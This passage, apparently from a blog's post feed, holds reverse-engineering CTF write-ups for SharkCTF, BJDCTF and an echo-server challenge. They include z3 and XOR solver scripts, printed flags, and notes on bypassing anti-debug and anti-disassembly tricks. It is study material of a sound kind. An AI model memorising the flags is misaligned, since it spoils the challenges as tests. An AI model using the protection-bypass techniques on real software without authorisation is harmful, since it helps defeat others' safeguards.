class="hljs-number">0x1d</span>,<span class="hljs-number">0x5a</span>,<span class="hljs-number">0x4f</span>,<span class="hljs-number">0xbf</span>]</span><br><span class="line">some_array=[<span class="hljs-number">10</span>,<span class="hljs-number">2</span>,<span class="hljs-number">30</span>,<span class="hljs-number">15</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">24</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">24</span>,<span class="hljs-number">4</span>,<span class="hljs-number">14</span>,<span class="hljs-number">13</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">23</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">2</span>,<span class="hljs-number">30</span>,<span class="hljs-number">15</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">24</span>]</span><br><span class="line">flag=<span class="hljs-string">""</span></span><br><span class="line"><span class="hljs-keyword">for</span> i,t <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(target):</span><br><span class="line">    flag+=<span class="hljs-built_in">chr</span>((t^<span class="hljs-number">42</span>)-some_array[i])</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># shkCTF{h3ll0_fr0m_ASM_my_fr13nd}</span></span><br></pre></td></tr></tbody></table></figure><h5 id="z3-robot"><a href="#z3-robot" class="headerlink" title="z3_robot"></a>z3_robot</h5><p>Just input and then pass a few equations, so it’s quite easy to solve it with z3 as the title says</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a1 = []</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">25</span>):</span><br><span class="line">    a1.append(BitVec(<span class="hljs-string">"s%d"</span> % i, <span class="hljs-number">32</span>))</span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line">solver.add((a1[<span class="hljs-number">20</span>] ^ <span class="hljs-number">0x2B</span>) == a1[<span class="hljs-number">7</span>])</span><br><span class="line">solver.add(a1[<span class="hljs-number">21</span>] - a1[<span class="hljs-number">3</span>] == -<span class="hljs-number">20</span>)</span><br><span class="line">solver.add((a1[<span class="hljs-number">2</span>] &gt;&gt; <span class="hljs-number">6</span>) == <span class="hljs-number">0</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">13</span>] == <span class="hljs-number">116</span>)</span><br><span class="line">solver.add(<span class="hljs-number">4</span> * a1[<span class="hljs-number">11</span>] == <span class="hljs-number">380</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">7</span>] &gt;&gt; a1[<span class="hljs-number">17</span>] % <span class="hljs-number">8</span> == <span class="hljs-number">5</span>)</span><br><span class="line">solver.add((a1[<span class="hljs-number">6</span>] ^ <span class="hljs-number">0x53</span>) == a1[<span class="hljs-number">14</span>])</span><br><span class="line">solver.add(a1[<span class="hljs-number">8</span>] == <span class="hljs-number">122</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">5</span>] &lt;&lt; a1[<span class="hljs-number">9</span>] % <span class="hljs-number">8</span> == <span class="hljs-number">392</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">16</span>] - a1[<span class="hljs-number">7</span>] == <span class="hljs-number">20</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">7</span>] &lt;&lt; a1[<span class="hljs-number">23</span>] % <span class="hljs-number">8</span> == <span class="hljs-number">190</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">2</span>] - a1[<span class="hljs-number">7</span>] == -<span class="hljs-number">43</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">21</span>] == <span class="hljs-number">95</span>)</span><br><span class="line">solver.add((a1[<span class="hljs-number">2</span>] ^ <span class="hljs-number">0x47</span>) == a1[<span class="hljs-number">3</span>])</span><br><span class="line">solver.add(a1[<span class="hljs-number">0</span>] == <span class="hljs-number">99</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">13</span>] == <span class="hljs-number">116</span>)</span><br><span class="line">solver.add((a1[<span class="hljs-number">20</span>] &amp; <span class="hljs-number">0x45</span>) == <span class="hljs-number">68</span>)</span><br><span class="line">solver.add((a1[<span class="hljs-number">8</span>] &amp; <span class="hljs-number">0x15</span>) == <span class="hljs-number">16</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">12</span>] == <span class="hljs-number">95</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">4</span>] &gt;&gt; <span class="hljs-number">4</span> == <span class="hljs-number">7</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">13</span>] == <span class="hljs-number">116</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">0</span>] &gt;&gt; a1[<span class="hljs-number">0</span>] % <span class="hljs-number">8</span> == <span class="hljs-number">12</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">10</span>] == <span class="hljs-number">95</span>)</span><br><span class="line">solver.add((a1[<span class="hljs-number">8</span>] &amp; <span class="hljs-number">0xAC</span>) == <span class="hljs-number">40</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">16</span>] == <span class="hljs-number">115</span>)</span><br><span class="line">solver.add((a1[<span class="hljs-number">22</span>] &amp; <span class="hljs-number">0x1D</span>) == <span class="hljs-number">24</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">9</span>] == <span class="hljs-number">51</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">5</span>] == <span class="hljs-number">49</span>)</span><br><span class="line">solver.add(<span class="hljs-number">4</span> * a1[<span class="hljs-number">19</span>] == <span class="hljs-number">456</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">20</span>] &gt;&gt; <span class="hljs-number">6</span> == <span class="hljs-number">1</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">7</span>] &gt;&gt; <span class="hljs-number">1</span> == <span class="hljs-number">47</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">1</span>] == <span class="hljs-number">108</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">3</span>] &gt;&gt; <span class="hljs-number">4</span> == <span class="hljs-number">7</span>)</span><br><span class="line">solver.add((a1[<span class="hljs-number">19</span>] &amp; <span class="hljs-number">0x49</span>) == <span class="hljs-number">64</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">4</span>] == <span class="hljs-number">115</span>)</span><br><span class="line">solver.add((a1[<span class="hljs-number">2</span>] &amp; a1[<span class="hljs-number">11</span>]) == <span class="hljs-number">20</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">0</span>] == <span class="hljs-number">99</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">4</span>] + a1[<span class="hljs-number">5</span>] == <span class="hljs-number">164</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">15</span>] &lt;&lt; <span class="hljs-number">6</span> == <span class="hljs-number">6080</span>)</span><br><span class="line">solver.add((a1[<span class="hljs-number">10</span>] ^ <span class="hljs-number">0x2B</span>) == a1[<span class="hljs-number">17</span>])</span><br><span class="line">solver.add((a1[<span class="hljs-number">12</span>] ^ <span class="hljs-number">0x2C</span>) == a1[<span class="hljs-number">4</span>])</span><br><span class="line">solver.add(a1[<span class="hljs-number">19</span>] - a1[<span class="hljs-number">21</span>] == <span class="hljs-number">19</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">12</span>] == <span class="hljs-number">95</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">15</span>] &gt;&gt; <span class="hljs-number">1</span> == <span class="hljs-number">47</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">19</span>] == <span class="hljs-number">114</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">17</span>] + a1[<span class="hljs-number">18</span>] == <span class="hljs-number">168</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">22</span>] == <span class="hljs-number">58</span>)</span><br><span class="line">solver.add((a1[<span class="hljs-number">23</span>] &amp; a1[<span class="hljs-number">21</span>]) == <span class="hljs-number">9</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">6</span>] &lt;&lt; a1[<span class="hljs-number">19</span>] % <span class="hljs-number">8</span> == <span class="hljs-number">396</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">3</span>] + a1[<span class="hljs-number">7</span>] == <span class="hljs-number">210</span>)</span><br><span class="line">solver.add((a1[<span class="hljs-number">22</span>] &amp; <span class="hljs-number">0xED</span>) == <span class="hljs-number">40</span>)</span><br><span class="line">solver.add((a1[<span class="hljs-number">12</span>] &amp; <span class="hljs-number">0xAC</span>) == <span class="hljs-number">12</span>)</span><br><span class="line">solver.add((a1[<span class="hljs-number">18</span>] ^ <span class="hljs-number">0x6B</span>) == a1[<span class="hljs-number">15</span>])</span><br><span class="line">solver.add((a1[<span class="hljs-number">16</span>] &amp; <span class="hljs-number">0x7A</span>) == <span class="hljs-number">114</span>)</span><br><span class="line">solver.add((a1[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0x39</span>) == <span class="hljs-number">33</span>)</span><br><span class="line">solver.add((a1[<span class="hljs-number">6</span>] ^ <span class="hljs-number">0x3C</span>) == a1[<span class="hljs-number">21</span>])</span><br><span class="line">solver.add(a1[<span class="hljs-number">20</span>] == <span class="hljs-number">116</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">19</span>] == <span class="hljs-number">114</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">12</span>] == <span class="hljs-number">95</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">2</span>] == <span class="hljs-number">52</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">23</span>] == <span class="hljs-number">41</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">10</span>] == <span class="hljs-number">95</span>)</span><br><span class="line">solver.add((a1[<span class="hljs-number">22</span>] &amp; a1[<span class="hljs-number">9</span>]) == <span class="hljs-number">50</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">3</span>] + a1[<span class="hljs-number">2</span>] == <span class="hljs-number">167</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">17</span>] - a1[<span class="hljs-number">14</span>] == <span class="hljs-number">68</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">21</span>] == <span class="hljs-number">95</span>)</span><br><span class="line">solver.add((a1[<span class="hljs-number">19</span>] ^ <span class="hljs-number">0x2D</span>) == a1[<span class="hljs-number">10</span>])</span><br><span class="line">solver.add(<span class="hljs-number">4</span> * a1[<span class="hljs-number">12</span>] == <span class="hljs-number">380</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">6</span>] &amp; <span class="hljs-number">0x40</span> != <span class="hljs-number">0</span>)</span><br><span class="line">solver.add((a1[<span class="hljs-number">12</span>] &amp; a1[<span class="hljs-number">22</span>]) == <span class="hljs-number">26</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">7</span>] &lt;&lt; a1[<span class="hljs-number">19</span>] % <span class="hljs-number">8</span> == <span class="hljs-number">380</span>)</span><br><span class="line">solver.add((a1[<span class="hljs-number">20</span>] ^ <span class="hljs-number">0x4E</span>) == a1[<span class="hljs-number">22</span>])</span><br><span class="line">solver.add(a1[<span class="hljs-number">6</span>] == <span class="hljs-number">99</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">12</span>] == a1[<span class="hljs-number">7</span>])</span><br><span class="line">solver.add(a1[<span class="hljs-number">19</span>] - a1[<span class="hljs-number">13</span>] == -<span class="hljs-number">2</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">14</span>] &gt;&gt; <span class="hljs-number">4</span> == <span class="hljs-number">3</span>)</span><br><span class="line">solver.add((a1[<span class="hljs-number">12</span>] &amp; <span class="hljs-number">0x38</span>) == <span class="hljs-number">24</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">8</span>] &lt;&lt; a1[<span class="hljs-number">10</span>] % <span class="hljs-number">8</span> == <span class="hljs-number">15616</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">20</span>] == <span class="hljs-number">116</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">6</span>] &gt;&gt; a1[<span class="hljs-number">22</span>] % <span class="hljs-number">8</span> == <span class="hljs-number">24</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">22</span>] - a1[<span class="hljs-number">5</span>] == <span class="hljs-number">9</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">7</span>] &lt;&lt; a1[<span class="hljs-number">22</span>] % <span class="hljs-number">8</span> == <span class="hljs-number">380</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">22</span>] == <span class="hljs-number">58</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">16</span>] == <span class="hljs-number">115</span>)</span><br><span class="line">solver.add((a1[<span class="hljs-number">23</span>] ^ <span class="hljs-number">0x1D</span>) == a1[<span class="hljs-number">18</span>])</span><br><span class="line">solver.add(a1[<span class="hljs-number">23</span>] + a1[<span class="hljs-number">14</span>] == <span class="hljs-number">89</span>)</span><br><span class="line">solver.add((a1[<span class="hljs-number">5</span>] &amp; a1[<span class="hljs-number">2</span>]) == <span class="hljs-number">48</span>)</span><br><span class="line">solver.add((a1[<span class="hljs-number">15</span>] &amp; <span class="hljs-number">0x9F</span>) == <span class="hljs-number">31</span>)</span><br><span class="line">solver.add(a1[<span class="hljs-number">4</span>] == <span class="hljs-number">115</span>)</span><br><span class="line">solver.add((a1[<span class="hljs-number">23</span>] ^ <span class="hljs-number">0x4A</span>) == a1[<span class="hljs-number">0</span>])</span><br><span class="line">solver.add((a1[<span class="hljs-number">6</span>] ^ <span class="hljs-number">0x3C</span>) == a1[<span class="hljs-number">11</span>])</span><br><span class="line">flag = <span class="hljs-string">""</span></span><br><span class="line"><span class="hljs-keyword">if</span> solver.check() == sat:</span><br><span class="line">    r = solver.model()</span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">24</span>):</span><br><span class="line">        flag += <span class="hljs-built_in">chr</span>(r[a1[i]].as_long() &amp; <span class="hljs-number">0xff</span>)</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br><span class="line"><span class="hljs-comment"># shkCTF{cl4ss1c_z3___t0_st4rt_:)}</span></span><br></pre></td></tr></tbody></table></figure><h5 id="secure-db"><a href="#secure-db" class="headerlink" title="secure_db"></a>secure_db</h5><p>I can’t see anything using IDA so I debugged it and I found the input got processed and then compared with <code>N3kviX7-vXEqvlp</code> , I just input this string and got an interesting string <code>T4h7s_4ll_F0lks</code> which seems like to be the right one.</p><p>So this reversing algorithm seems to be itself, and I tried to rewrite it with python and I got the same answer</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="hljs-string">"N3kviX7-vXEqvlp"</span></span><br><span class="line">x = [<span class="hljs-number">0x1a</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x41</span>]</span><br><span class="line">key = <span class="hljs-string">""</span></span><br><span class="line"><span class="hljs-keyword">for</span> i, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(target):</span><br><span class="line">    key += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(c) ^ x[i % <span class="hljs-number">4</span>])</span><br><span class="line"><span class="hljs-built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># T4h7s_4ll_F0lks</span></span><br></pre></td></tr></tbody></table></figure><p>Just input the key and we will get a database file from the server, and there is the flag.</p><h5 id="miss-direction"><a href="#miss-direction" class="headerlink" title="miss_direction"></a>miss_direction</h5><p>Actually I haven’t solved it yet, I however managed to anti anti-debug (just remove tls table from PE headers will be fine), and then the exception handler really confused me,I can’t find anything to do with my input, I really got missed… </p></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
            <tag> SharkCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF-re-wp</title>
      <link href="/2020/03/21/BJDCTF-re-wp/"/>
      <url>/2020/03/21/BJDCTF-re-wp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p><del>这么长时间就出了两道这么简单的re出题人的良心不会痛吗</del></p><p>re选手做完两道题结束比赛……</p><p>本来还想做做pwn，有时间再说吧</p><span id="more"></span><h4 id="guessgame"><a href="#guessgame" class="headerlink" title="guessgame"></a>guessgame</h4><p>随机数用时间种子初始化过了，猜是猜不对的，而且猜对了也没用，会输出flag不在这里，但是可以直接用IDA直接找到flag……</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">BJD</span>{S<span class="hljs-number">1</span>mple_ReV<span class="hljs-number">3</span>r<span class="hljs-number">5</span>e_W<span class="hljs-number">1</span>th_<span class="hljs-number">0</span>D_<span class="hljs-number">0</span>r_IDA}</span><br></pre></td></tr></tbody></table></figure><h4 id="reverse-8086-ASM-DreamerJack"><a href="#reverse-8086-ASM-DreamerJack" class="headerlink" title="reverse-8086_ASM-DreamerJack"></a>reverse-8086_ASM-DreamerJack</h4><p>16位DOS……</p><p>IDA打开，发现一段数据很奇怪，转换成code</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mov     cx, 22h ; '"'</span><br><span class="line">seg001:0005                 lea     bx, aUDuTZWjQGjzZWz ; "]U[du~|t@{z@wj.}.~q@gjz{z@wzqW~/b;"</span><br><span class="line">seg001:0009</span><br><span class="line">seg001:0009 loc_10039:                              ; CODE XREF: seg001:000F↓j</span><br><span class="line">seg001:0009                 mov     di, cx</span><br><span class="line">seg001:000B                 dec     di</span><br><span class="line">seg001:000C                 xor     byte ptr [bx+di], 1Fh</span><br><span class="line">seg001:000F                 loop    loc_10039</span><br><span class="line">seg001:0011                 lea     dx, aUDuTZWjQGjzZWz ; "]U[du~|t@{z@wj.}.~q@gjz{z@wzqW~/b;"</span><br><span class="line">seg001:0015                 mov     ah, 9</span><br><span class="line">seg001:0017                 int     21h             ; DOS - PRINT STRING</span><br><span class="line">seg001:0017                                         ; DS:DX -&gt; string terminated by "$"</span><br><span class="line">seg001:0019                 retn</span><br></pre></td></tr></tbody></table></figure><p>异或，循环，输出……</p><p>跑一下</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">target = [<span class="hljs-number">0x5D</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x7E</span>,</span><br><span class="line">          <span class="hljs-number">0x71</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x3B</span>]</span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x22</span>):</span><br><span class="line">    flag += <span class="hljs-built_in">chr</span>(target[i] ^ <span class="hljs-number">0x1F</span>)</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>输出flag，其中**<code>$</code>是DOS终止符**</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">BJD</span>{jack_de_hu<span class="hljs-number">1</span>b<span class="hljs-number">1</span>an_xuede_henHa<span class="hljs-number">0</span>}$</span><br></pre></td></tr></tbody></table></figure><h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>溜了，<del>刷攻防世界去了</del></p><p>补作业去了</p></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
            <tag> BJDCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界_echo-server_wp</title>
      <link href="/2020/03/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-echo-server-wp/"/>
      <url>/2020/03/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-echo-server-wp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>这题涉及到去花和patch，难度不是很大</p><span id="more"></span><p>先file查看一下文件，32位ELF，运行一下</p><figure class="highlight asciidoc hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">**************</span><br><span class="line">Echo Server 0.3 ALPHA</span><br><span class="line">**************</span><br></pre></td></tr></tbody></table></figure><p>等待输入，随便输入一句</p><figure class="highlight nginx hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">hhh</span></span><br><span class="line"><span class="hljs-number">686868</span></span><br></pre></td></tr></tbody></table></figure><p>直接返回了ASCII码值</p><p>用IDA打开看看</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-number">0</span>);</span><br><span class="line">  <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-number">0</span>);</span><br><span class="line">  dword_804A088 = <span class="hljs-number">1</span>;</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"               **************\n               Echo Server 0.3 ALPHA\n               **************"</span>);</span><br><span class="line">  ((<span class="hljs-built_in"><span class="hljs-keyword">void</span></span> (*)(<span class="hljs-keyword">void</span>))((<span class="hljs-keyword">char</span> *)&amp;loc_80487C1 + <span class="hljs-number">3</span>))();</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><code>main</code>函数没什么特别的，就是最后这个函数调用很古怪，所以进去看看</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> __cdecl <span class="hljs-title">sub_804875D</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> __int8 *a1, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a2)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int8 *v2; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v3; <span class="hljs-comment">// zf</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int8 *v4; <span class="hljs-comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = a1;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( a1 )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; a2; ++i )</span><br><span class="line">    {</span><br><span class="line">      v2 = v4++;</span><br><span class="line">      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%02X"</span>, *v2);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"NULL"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">10</span>);</span><br><span class="line">  <span class="hljs-built_in">JUMPOUT</span>(v3, (<span class="hljs-keyword">char</span> *)&amp;loc_80487C1 + <span class="hljs-number">1</span>);</span><br><span class="line">  <span class="hljs-built_in">JUMPOUT</span>(!v3, (<span class="hljs-keyword">char</span> *)&amp;loc_80487C1 + <span class="hljs-number">1</span>);</span><br><span class="line">  MEMORY[<span class="hljs-number">0x915A4B8F</span>]();</span><br><span class="line">  <span class="hljs-built_in">JUMPOUT</span>(loc_80487C6);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>出现了访问内存越界的情况<code>MEMORY[0x915A4B8F]()</code>，看到上面两句更加古怪</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span 